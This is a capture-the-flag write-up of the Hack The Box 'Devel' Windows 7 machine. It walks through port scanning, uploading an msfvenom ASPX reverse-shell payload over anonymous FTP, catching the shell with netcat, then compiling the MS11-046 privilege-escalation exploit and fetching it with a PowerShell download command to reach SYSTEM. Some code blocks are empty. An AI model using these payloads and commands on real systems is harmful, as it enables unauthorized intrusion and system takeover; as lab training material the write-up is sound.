# Devel

[Devel](https://app.hackthebox.com/machines/Devel) is a Windows based challenge and it pretty easy. It focuses on specific privilege escalation vulnerability in a specific version of Windows 7.

So, let's get started.

## Enumeration

To determine all the services that are running on this machine we can start an `nmap` scan against it.

```
┌──(kali㉿kali)-[~/Desktop/htb/devel]
└─$ sudo nmap -p- -sS -T4 -oG open_ports 10.10.10.5    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-21 03:56 EDT
Nmap scan report for 10.10.10.5
Host is up (0.092s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 129.81 seconds
```

It can be seen that only 2 ports are open and we can run an in-depth scan against them to check if `nmap` can detect any vulnerabilities associated with them.

```

```

It looks like we can access FTP anonymously. So, we can check it out first.

```

03-17-17  05:37PM               184946 welcome.png
```

It looks like the data stored in the FTP server is being used to host the IIS based webpage. Apart from that nothing useful can be found in the FTP service.

When we access the IP address via browser we can see the same `welcome.png` being hosted which confirms our suspicion.

![image-20220821094754797](.\.images\image-20220821094754797.png)

This gives a clear hint that we can try to upload a malicious page from the FTP server and then invoke it by sending a request via our browser and then get a reverse shell. 

## Gaining Foothold

The first thing that we need is an ASPX based payload that we can upload on the FTP server and we can use `msfvenom` for that.

```
┌──(kali㉿kali)-[~/Desktop/htb/devel]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.4 LPORT=1337 -f aspx > shell.aspx 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2725 bytes
```

Once the payload is generated, the next task is to upload it.

```
┌──(kali㉿kali)-[~/Desktop/htb/devel]
└─$ ftp 10.10.10.5
Connected to 10.10.10.5.

```

Now, all we need to do is start a listener on port 1337 and try to access `http://10.10.10.5/shell.aspx` from our browser to get our reverse shell.

```
┌──(kali㉿kali)-[~/Desktop/htb/devel]
└─$ nc -nlvp 1337

c:\windows\system32\inetsrv>whoami

```

So, it looks like we got access as `iis apppool\web` but still we can't access the user flag. 

```

c:\Users>cd babis
cd babis
Access is denied.
```

This probably means either we need to escalate our privileges to SYSTEM or the user level.

## Privilege Escalation

To get started with PrivEsc, the first thing that we can look at would be the OS version running on this machine and if there are any exploits available for the same.

```

Here, it can be seen that the system is running on Windows 7 version 6.1.7600. So, we can look for exploits related to this particular windows version.

From a quick google search, the first exploit that pops up is [MS11-046](https://www.exploit-db.com/exploits/40564) with which we can perform a local privilege escalation. We can get the exploit from `searchsploit` and then all we need to do is compile it and send it to the target machine.

```
┌──(kali㉿kali)-[~/Desktop/htb/devel]
└─$ searchsploit -m 40564
  Exploit: Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)
      URL: https://www.exploit-db.com/exploits/40564
     Path: /usr/share/exploitdb/exploits/windows_x86/local/40564.c
File Type: C source, ASCII text

Copied to: /home/kali/Desktop/htb/devel/40564.c
```

The compilation instructions are given in the exploit itself but we need `i686-w64-mingw32-gcc` to compile it. 

This can be downloaded using the command `sudo apt install gcc-mingw-w64-i686` and then we can compile the code as

```
┌──(kali㉿kali)-[~/Desktop/htb/devel]
└─$ i686-w64-mingw32-gcc 40564.c -o exploit.exe -lws2_32
```

To send it over to the target machine, we have 2 ways:

1. Send it via already accessible FTP.
2. Fetch file via PowerShell command.

I tried the FTP option but for some reason the file becomes non-executable and given the following error

```
c:\Users\Public\Downloads>exploit.exe
exploit.exe
This program cannot be run in DOS mode.
```

I tried to run it from different directories but got the same error.

The next option that we can use is start a python server on our local machine with the command `python3 -m http.server` and then use the following PowerShell command to fetch it from the target machine.

```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.4:8000/exploit.exe', 'c:\Users\Public\Downloads\exploit.exe')"
```

*Make sure to download it in Public directory because user "iis apppool/web" might not have access to other directories.*

Once the file is fetched all we need to do it run it to get SYSTEM level access.

```
c:\Users\Public\Downloads>exploit.exe
exploit.exe

c:\Windows\System32>whoami
whoami
nt authority\system
```

As we got access as "nt authority\system" we can read both the user and root flags easily.

## Key Points to Take Away

1. When creating `msfvenom` payloads, test both x86 and x64 payloads.
2. If you get an error that program can't be executed, try to upload it via some other means (using python server with powershell/wget is the best way)
